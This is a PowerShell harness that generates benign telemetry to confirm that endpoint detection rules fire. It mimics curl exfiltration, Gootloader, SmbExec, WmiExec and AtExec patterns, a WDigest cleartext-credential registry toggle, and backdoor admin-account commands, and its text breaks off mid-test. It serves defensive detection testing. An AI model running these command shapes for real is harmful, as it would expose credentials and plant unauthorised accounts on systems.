#Requires -Version 5.1
<#
.SYNOPSIS
  Benign detection-validation harness for the SOCxxxx MDE/EDR endpoint rule library.

.DESCRIPTION
  Generates benign TELEMETRY that exercises each endpoint (Device*) detection's core
  predicate, so you can confirm each rule fires end-to-end (ingestion -> logic -> alert).
  Nothing here performs real credential theft, malware execution, C2 or data exfiltration.
  Every config change (registry / service / account / scheduled task) is reverted, every
  spawned process is benign and short-lived, and all artefacts live under a per-run TEMP dir.

  >>> AUTHORISED USE ONLY. Run on an ISOLATED lab / test VM you own. Some tests require
  >>> local admin, and a few briefly toggle security-relevant settings (WDigest, RDP,
  >>> RestrictedAdmin) before reverting them. Do NOT run on production or shared hosts. <<<

.PARAMETER Only        Comma-separated SOC IDs to run (e.g. SOC1010,SOC1023). Default: all.
.PARAMETER Exclude     SOC IDs to skip.
.PARAMETER ListTests   List available tests and exit.
.PARAMETER DryRun      Show what would run without executing anything.
.PARAMETER IncludeNetwork  Enable the network/canary tests (off by default).
.PARAMETER CanaryUrl   A URL/host YOU control for the network tests.
.PARAMETER RunId       Override the run marker (default: random 8 hex).

.EXAMPLE  .\Invoke-AllDetectionTests.ps1
.EXAMPLE  .\Invoke-AllDetectionTests.ps1 -Only SOC1010,SOC1017 -Verbose
.EXAMPLE  .\Invoke-AllDetectionTests.ps1 -IncludeNetwork -CanaryUrl https://mycanary.example/oast
#>
[CmdletBinding()]
param(
    [string[]]$Only,
    [string[]]$Exclude,
    [switch]$ListTests,
    [switch]$DryRun,
    [switch]$IncludeNetwork,
    [string]$CanaryUrl,
    [string]$RunId
)

# =================== shared helpers ===================
<#  _Common.ps1  --  shared helpers for the benign detection-validation harness.
    Dot-sourced by every Test-SOCxxxx.ps1 and by Invoke-AllDetectionTests.ps1.
    Everything here is designed to generate benign TELEMETRY only:
      * renamed copies of SIGNED OS binaries running harmless args
      * cmd /c echo of a command-line string (zero system effect)
      * benign marker files
      * registry writes captured and AUTO-REVERTED
      * services / scheduled tasks created then deleted
    No real credential theft, malware, C2 or data exfiltration is performed.
#>

$Global:ATR = [ordered]@{}
function Initialize-AtrRun {
    param([string]$RunId)
    if (-not $RunId) { $RunId = ([guid]::NewGuid().ToString('N').Substring(0,8)) }
    $Global:ATR.RunId  = $RunId
    $Global:ATR.WorkDir = Join-Path $env:TEMP ("ATRVAL_" + $RunId)
    $null = New-Item -ItemType Directory -Path $Global:ATR.WorkDir -Force -ErrorAction SilentlyContinue
    $Global:ATR.Results = [System.Collections.Generic.List[object]]::new()
    $Global:ATR.IsAdmin = ([Security.Principal.WindowsPrincipal] `
        [Security.Principal.WindowsIdentity]::GetCurrent()
        ).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    return $RunId
}

function Expand-AtrTokens {
    param([string]$s)
    if ($null -eq $s) { return $s }
    $rid = $Global:ATR.RunId
    $s = $s -replace '%RID%', $rid
    $s = $s -replace '%WD%',  [regex]::Escape($Global:ATR.WorkDir) -replace '\\\\','\'  # keep literal path
    $s = $s.Replace('%WD%', $Global:ATR.WorkDir)
    # random tokens
    $s = [regex]::Replace($s, '%A8%',  { -join ((97..122) | Get-Random -Count 8  | ForEach-Object {[char]$_}) })
    $s = [regex]::Replace($s, '%A10%', { -join ((97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_}) })
    $s = [regex]::Replace($s, '%TS10%',{ [string][DateTimeOffset]::UtcNow.ToUnixTimeSeconds() })
    return $s
}

function New-AtrResult {
    param($Id,$Desc,$Tactic,$Technique,$Status,$Detail,$Marker)
    [pscustomobject]@{
        Id=$Id; Description=$Desc; Tactic=$Tactic; Technique=$Technique
        Status=$Status; Detail=$Detail; Marker=$Marker; RunId=$Global:ATR.RunId
        Time=(Get-Date).ToUniversalTime().ToString('u')
    }
}

# run a benign process, wait, return exit info; never throws
function Invoke-AtrProc {
    param([string]$FilePath,[string]$Arguments='',[int]$TimeoutSec=15,[switch]$Hidden)
    try {
        $psi = [System.Diagnostics.ProcessStartInfo]::new()
        $psi.FileName  = $FilePath
        $psi.Arguments = $Arguments
        $psi.UseShellExecute = $false
        if ($Hidden) { $psi.WindowStyle='Hidden'; $psi.CreateNoWindow=$true }
        $p = [System.Diagnostics.Process]::Start($psi)
        if (-not $p.WaitForExit($TimeoutSec*1000)) { try{$p.Kill()}catch{} }
        return $true
    } catch { return $false }
}

# copy a benign signed OS binary to a new name in the workdir
function Copy-AtrBinary {
    param([string]$SourceLeaf,[string]$NewName)
    $src = Join-Path $env:SystemRoot "System32\$SourceLeaf"
    if (-not (Test-Path $src)) { throw "source $src not found" }
    $dst = Join-Path $Global:ATR.WorkDir $NewName
    Copy-Item $src $dst -Force
    return $dst
}

# set a registry value, remembering prior state, and hand back a revert scriptblock
function Set-AtrRegistry {
    param([string]$Key,[string]$Name,$Value,[string]$Type='DWord')
    if (-not (Test-Path $Key)) { New-Item -Path $Key -Force | Out-Null; $created=$true } else { $created=$false }
    $had = $false; $prior = $null
    try { $prior = (Get-ItemProperty -Path $Key -Name $Name -ErrorAction Stop).$Name; $had=$true } catch {}
    New-ItemProperty -Path $Key -Name $Name -Value $Value -PropertyType $Type -Force | Out-Null
    return {
        param()
        try {
            if ($had) { New-ItemProperty -Path $Key -Name $Name -Value $prior -PropertyType $Type -Force | Out-Null }
            else      { Remove-ItemProperty -Path $Key -Name $Name -ErrorAction SilentlyContinue }
            if ($created) { Remove-Item -Path $Key -Force -ErrorAction SilentlyContinue }
        } catch {}
    }.GetNewClosure()
}

function Remove-AtrWorkDir {
    try { Get-Process -ErrorAction SilentlyContinue |
            Where-Object { $_.Path -like ($Global:ATR.WorkDir + '*') } |
            Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
    Start-Sleep -Milliseconds 300
    Remove-Item -Path $Global:ATR.WorkDir -Recurse -Force -ErrorAction SilentlyContinue
}

# =================== per-detection tests ===================
#Requires -Version 5.1
# Test-SOC1006 :: Exfiltration via curl (--upload-file to local file:// - no egress)
# MITRE T1048 (Exfiltration)  |  kind=curl  |  BENIGN validation
function Test-SOC1006 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $curl = "$env:SystemRoot\System32\curl.exe"
    if (-not (Test-Path $curl)) { return (New-AtrResult 'SOC1006' 'Exfiltration via curl (--upload-file to local file:// - no egress)' 'Exfiltration' 'T1048' 'SKIP' 'curl.exe not present' $marker) }
    $srcf = Join-Path $wd ('src_'+$rid+'.txt'); Set-Content $srcf $marker -Force
    $dstf = Join-Path $wd ('dst_'+$rid+'.txt')
    $ok = Invoke-AtrProc -FilePath $curl -Arguments ('--upload-file "'+$srcf+'" "file:///'+($dstf -replace '\\','/')+'"') -Hidden -TimeoutSec 15
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail='curl --upload-file to local file:// (no egress)'
    $detail = $detail + ' | note: ' + 'Uses curl.exe --upload-file to a local file:// target so FileName=curl.exe and -T/--upload-file fire without network egress.'
    return (New-AtrResult 'SOC1006' 'Exfiltration via curl (--upload-file to local file:// - no egress)' 'Exfiltration' 'T1048' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1007 :: Potential pentest (AccountName contains 'pentest')
# MITRE T1078 (Initial Access)  |  kind=logon  |  BENIGN validation
function Test-SOC1007 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1007' 'Potential pentest (AccountName contains ''pentest'')' 'Initial Access' 'T1078' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $u = 'pentest_'+$rid; $p='P@ss_'+$rid+'!'
    $ok=$false
    try {
      $null = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\net.exe" -Arguments ('user '+$u+' '+$p+' /add') -Hidden
      $sec = ConvertTo-SecureString $p -AsPlainText -Force
      $cred = [System.Management.Automation.PSCredential]::new("$env:COMPUTERNAME\$u",$sec)
      $null = Start-Process -FilePath "$env:SystemRoot\System32\whoami.exe" -Credential $cred -WindowStyle Hidden -ErrorAction Stop
      Start-Sleep -Seconds 2; $ok=$true
    } catch {}
    $null = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\net.exe" -Arguments ('user '+$u+' /delete') -Hidden
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail='benign logon as '+$u+' then account deleted'
    $detail = $detail + ' | note: ' + 'Creates local user ''pentest_%RID%'', performs a benign logon, then deletes the account.'
    return (New-AtrResult 'SOC1007' 'Potential pentest (AccountName contains ''pentest'')' 'Initial Access' 'T1078' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1008 :: Gootloader exec ancestry (wscript -> cmd -> cscript, .JS)
# MITRE T1059.007 (Execution)  |  kind=chain3  |  BENIGN validation
function Test-SOC1008 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $js = Join-Path $wd ('atr_'+$rid+'.js')
    $cs = Join-Path $wd ('leaf_'+$rid+'.js')
    Set-Content $cs ('WScript.Echo("'+$marker+'");') -Encoding ASCII -Force
    $jsbody = 'var s=new ActiveXObject("WScript.Shell");s.Run("cmd /c cscript //nologo \"'+$cs+'\"",0,false);'
    Set-Content $js $jsbody -Encoding ASCII -Force
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\wscript.exe" -Arguments ('//nologo "'+$js+'"') -Hidden
    $detail='wscript -> cmd -> cscript (benign .js)'
    $status = if($ok){'RAN'}else{'PARTIAL'}
    $detail = $detail + ' | note: ' + 'Builds wscript.exe -> cmd.exe -> cscript.exe running a benign .js.'
    return (New-AtrResult 'SOC1008' 'Gootloader exec ancestry (wscript -> cmd -> cscript, .JS)' 'Execution' 'T1059.007' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1009 :: Generic RMM tool observed (FileName contains teamviewer)
# MITRE T1219 (Command and Control)  |  kind=renproc  |  BENIGN validation
function Test-SOC1009 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $dst = Copy-AtrBinary -SourceLeaf 'whoami.exe' -NewName 'TeamViewer.exe'
    $args = Expand-AtrTokens ''
    $ok = Invoke-AtrProc -FilePath $dst -Arguments $args -Hidden -TimeoutSec 15
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'ran signed OS binary renamed to TeamViewer.exe'
    return (New-AtrResult 'SOC1009' 'Generic RMM tool observed (FileName contains teamviewer)' 'Command and Control' 'T1219' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1010 :: Local account created via net.exe
# MITRE T1136.001 (Persistence)  |  kind=proc  |  BENIGN validation
function Test-SOC1010 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1010' 'Local account created via net.exe' 'Persistence' 'T1136.001' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'net user ATRVAL_%RID% P@ssw0rd_%RID%! /add'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $pc = Expand-AtrTokens 'net user ATRVAL_%RID% /delete'
    $pexe = ($pc -split ' ',2)[0]; $parg = ($pc -split ' ',2)[1]
    if ($pexe -notmatch '\\|:') { $pexe = "$env:SystemRoot\System32\$pexe"; if(-not $pexe.ToLower().EndsWith('.exe')){$pexe+='.exe'} }
    $null = Invoke-AtrProc -FilePath $pexe -Arguments $parg -Hidden -TimeoutSec 20
    $status = if($ok){'RAN'}else{'PARTIAL'}
    return (New-AtrResult 'SOC1010' 'Local account created via net.exe' 'Persistence' 'T1136.001' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1011 :: AtExec command execution (AccountName=system, parent has 'Schedule')
# MITRE T1053.002 (Lateral Movement)  |  kind=manual  |  BENIGN validation
function Test-SOC1011 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1011' 'AtExec command execution (AccountName=system, parent has ''Schedule'')' 'Lateral Movement' 'T1053.002' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $detail = 'NOT auto-run: Requires cmd.exe running as SYSTEM under the Task Scheduler service with a Temp\<rand> 2>&1 cmdline.'
    $scaf = 'schtasks /create /ru SYSTEM /sc once /tn ATRVAL_%RID% /tr "cmd /c echo C:\Windows\Temp\ATRVAL01.tmp 2>&1" then /run then /delete (elevated).'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1011' 'AtExec command execution (AccountName=system, parent has ''Schedule'')' 'Lateral Movement' 'T1053.002' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1012 :: AtExec scheduled task (8-char name, %windir%\Temp args)
# MITRE T1053.005 (Lateral Movement)  |  kind=schtask  |  BENIGN validation
function Test-SOC1012 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1012' 'AtExec scheduled task (8-char name, %windir%\Temp args)' 'Lateral Movement' 'T1053.005' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $tn = Expand-AtrTokens 'ATR_%A8%'
    $ta = Expand-AtrTokens 'cmd /c echo %windir%\Temp ATRVAL_%RID% 2^>^&1'
    $create = '/create /f /tn "'+$tn+'" /sc once /st 23:59 /tr "'+$ta+'"'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\schtasks.exe" -Arguments $create -Hidden -TimeoutSec 15
    Start-Sleep -Milliseconds 400
    $null = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\schtasks.exe" -Arguments ('/delete /f /tn "'+$tn+'"') -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail='scheduled task '+$tn+' created+deleted'
    return (New-AtrResult 'SOC1012' 'AtExec scheduled task (8-char name, %windir%\Temp args)' 'Lateral Movement' 'T1053.005' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1013 :: SmbExec batch-file creation structure (benign echo to C:\Windows\<8>.bat)
# MITRE T1021.002 (Lateral Movement)  |  kind=proc  |  BENIGN validation
function Test-SOC1013 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1013' 'SmbExec batch-file creation structure (benign echo to C:\Windows\<8>.bat)' 'Lateral Movement' 'T1021.002' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'cmd.exe /Q /c echo REM ATRVAL_%RID% \C$\__output 2^>^&1 > C:\Windows\%A8%.bat & del C:\Windows\%A8%.bat'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    $detail = $detail + ' | note: ' + 'Reproduces the SmbExec batch artefact/cmdline shape benignly (writes+deletes an 8-char .bat that only holds a REM).'
    return (New-AtrResult 'SOC1013' 'SmbExec batch-file creation structure (benign echo to C:\Windows\<8>.bat)' 'Lateral Movement' 'T1021.002' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1014 :: SmbExec command execution (parent=services.exe, SmbExec cmdline)
# MITRE T1021.002 (Lateral Movement)  |  kind=manual  |  BENIGN validation
function Test-SOC1014 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: Requires cmd.exe whose parent is services.exe with the SmbExec cmdline (only the SCM spawns services.exe children).'
    $scaf = 'Use impacket smbexec.py from an authorised test attacker box against the sensor VM.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1014' 'SmbExec command execution (parent=services.exe, SmbExec cmdline)' 'Lateral Movement' 'T1021.002' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1015 :: SmbExec service creation (LocalSystem, 8/10-char name, %COMSPEC% cmdline)
# MITRE T1021.002 (Lateral Movement)  |  kind=svc  |  BENIGN validation
function Test-SOC1015 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1015' 'SmbExec service creation (LocalSystem, 8/10-char name, %COMSPEC% cmdline)' 'Lateral Movement' 'T1021.002' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $sn = Expand-AtrTokens '%A10%'
    $bp = Expand-AtrTokens '%COMSPEC% /Q /c echo %COMPUTERNAME% %SYSTEMROOT% ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\sc.exe" -Arguments ('create '+$sn+' binPath= "'+$bp+'" type= own start= demand obj= LocalSystem') -Hidden -TimeoutSec 15
    Start-Sleep -Milliseconds 400
    $null = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\sc.exe" -Arguments ('delete '+$sn) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail='service '+$sn+' installed+deleted (LocalSystem)'
    return (New-AtrResult 'SOC1015' 'SmbExec service creation (LocalSystem, 8/10-char name, %COMSPEC% cmdline)' 'Lateral Movement' 'T1021.002' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1016 :: WDigest UseLogonCredential enable (process cmdline signature only)
# MITRE T1003 (Credential Access)  |  kind=echo  |  BENIGN validation
function Test-SOC1016 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 :: ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1016' 'WDigest UseLogonCredential enable (process cmdline signature only)' 'Credential Access' 'T1003' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1017 :: WDigest UseLogonCredential=1 via registry (set + auto-revert)
# MITRE T1112 (Credential Access)  |  kind=reg  |  BENIGN validation
function Test-SOC1017 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1017' 'WDigest UseLogonCredential=1 via registry (set + auto-revert)' 'Credential Access' 'T1112' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $reverts=@(); $keys=@()
    $k=Expand-AtrTokens 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest'; $n=Expand-AtrTokens 'UseLogonCredential'; $v=1
    try { $rev = Set-AtrRegistry -Key $k -Name $n -Value $v -Type 'DWord'; $reverts+=$rev; $keys+=($k+'\'+$n) } catch {}
    Start-Sleep -Milliseconds 500
    foreach($r in $reverts){ & $r }
    $status = if($keys.Count){'RAN'}else{'ERROR'}; $detail='set+reverted: ' + ($keys -join '; ')
    $detail = $detail + ' | note: ' + 'Briefly enables WDigest cleartext creds then reverts. Isolated hosts only.'
    return (New-AtrResult 'SOC1017' 'WDigest UseLogonCredential=1 via registry (set + auto-revert)' 'Credential Access' 'T1112' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1018 :: WmiExec command execution (parent=WmiPrvSE via wmic process call create)
# MITRE T1047 (Lateral Movement)  |  kind=procchain  |  BENIGN validation
function Test-SOC1018 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $childExe = "$env:SystemRoot\System32\None"
    $childArgs = Expand-AtrTokens ''
    $wmicArg = Expand-AtrTokens 'process call create "cmd.exe /Q /c echo \\127.0.0.1\ADMIN$\__output 2>&1 ATRVAL_%RID%"'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\wbem\WMIC.exe" -Arguments $wmicArg -Hidden
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail = 'parent=wmic -> child'
    $detail = $detail + ' | note: ' + 'Launched through WMI so InitiatingProcessFileName=WmiPrvSE.exe; the ADMIN$/2>&1 tokens are echoed text, not a real redirect.'
    return (New-AtrResult 'SOC1018' 'WmiExec command execution (parent=WmiPrvSE via wmic process call create)' 'Lateral Movement' 'T1047' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1019 :: WmiExec output file artefact (C:\Windows\__<10digits>)
# MITRE T1021.002 (Lateral Movement)  |  kind=file  |  BENIGN validation
function Test-SOC1019 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1019' 'WmiExec output file artefact (C:\Windows\__<10digits>)' 'Lateral Movement' 'T1021.002' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $made=@()
    $fp = Expand-AtrTokens 'C:\Windows\__%TS10%.tmp'
    try { $null=New-Item -ItemType Directory -Path (Split-Path $fp) -Force -ErrorAction SilentlyContinue; Set-Content -Path $fp -Value $marker -Force -ErrorAction Stop; $made+=$fp } catch {}
    $status = if($made.Count){'RAN'}else{'ERROR'}; $detail = ($made -join '; ')
    Start-Sleep -Milliseconds 400
    foreach($m in $made){ Remove-Item $m -Force -ErrorAction SilentlyContinue }
    return (New-AtrResult 'SOC1019' 'WmiExec output file artefact (C:\Windows\__<10digits>)' 'Lateral Movement' 'T1021.002' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1020 :: Credential theft via SecretsDump (NamedPipe+NTLM logon+RemoteRegistry)
# MITRE T1003 (Credential Access)  |  kind=manual  |  BENIGN validation
function Test-SOC1020 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: Correlates kernel NamedPipe, network NTLM logon and RemoteRegistry service start - requires a real remote secretsdump.'
    $scaf = 'Run impacket secretsdump.py from a test attacker host against the sensor VM.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1020' 'Credential theft via SecretsDump (NamedPipe+NTLM logon+RemoteRegistry)' 'Credential Access' 'T1003' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1021 :: Named pipe access indicating remote LSA theft (initiator=ntoskrnl.exe)
# MITRE T1003.001 (Credential Access)  |  kind=manual  |  BENIGN validation
function Test-SOC1021 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: NamedPipeEvent attributed to ntoskrnl.exe is kernel-generated by remote SMB pipe access; not benignly reproducible from user mode locally.'
    $scaf = 'From an authorised attacker box run impacket secretsdump/lsassy against the sensor VM over SMB.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1021' 'Named pipe access indicating remote LSA theft (initiator=ntoskrnl.exe)' 'Credential Access' 'T1003.001' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1022 :: Gootloader persistence task (args match [a-z]{6}~1.js)
# MITRE T1053.005 (Persistence)  |  kind=schtask  |  BENIGN validation
function Test-SOC1022 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $tn = Expand-AtrTokens 'ATR_ATRVAL_%RID%'
    $ta = Expand-AtrTokens 'wscript ATRVAL~1.js'
    $create = '/create /f /tn "'+$tn+'" /sc once /st 23:59 /tr "'+$ta+'"'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\schtasks.exe" -Arguments $create -Hidden -TimeoutSec 15
    Start-Sleep -Milliseconds 400
    $null = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\schtasks.exe" -Arguments ('/delete /f /tn "'+$tn+'"') -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail='scheduled task '+$tn+' created+deleted'
    return (New-AtrResult 'SOC1022' 'Gootloader persistence task (args match [a-z]{6}~1.js)' 'Persistence' 'T1053.005' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1023 :: Account added to local Administrators via net.exe
# MITRE T1098 (Privilege Escalation)  |  kind=proc  |  BENIGN validation
function Test-SOC1023 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1023' 'Account added to local Administrators via net.exe' 'Privilege Escalation' 'T1098' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'net user ATRVAL_%RID% P@ssw0rd_%RID%! /add'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $c = Expand-AtrTokens 'net localgroup administrators ATRVAL_%RID% /add'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $pc = Expand-AtrTokens 'net localgroup administrators ATRVAL_%RID% /delete'
    $pexe = ($pc -split ' ',2)[0]; $parg = ($pc -split ' ',2)[1]
    if ($pexe -notmatch '\\|:') { $pexe = "$env:SystemRoot\System32\$pexe"; if(-not $pexe.ToLower().EndsWith('.exe')){$pexe+='.exe'} }
    $null = Invoke-AtrProc -FilePath $pexe -Arguments $parg -Hidden -TimeoutSec 20
    $pc = Expand-AtrTokens 'net user ATRVAL_%RID% /delete'
    $pexe = ($pc -split ' ',2)[0]; $parg = ($pc -split ' ',2)[1]
    if ($pexe -notmatch '\\|:') { $pexe = "$env:SystemRoot\System32\$pexe"; if(-not $pexe.ToLower().EndsWith('.exe')){$pexe+='.exe'} }
    $null = Invoke-AtrProc -FilePath $pexe -Arguments $parg -Hidden -TimeoutSec 20
    $status = if($ok){'RAN'}else{'PARTIAL'}
    return (New-AtrResult 'SOC1023' 'Account added to local Administrators via net.exe' 'Privilege Escalation' 'T1098' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1024 :: Known-adversary TTP cmdline (net user CtxAppVCOMService / sc start AppMgmt)
# MITRE T1059 (Execution)  |  kind=echo  |  BENIGN validation
function Test-SOC1024 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'net user CtxAppVCOMService CtxAdm1234!@# /add & sc start AppMgmt ATRVAL_%RID%'
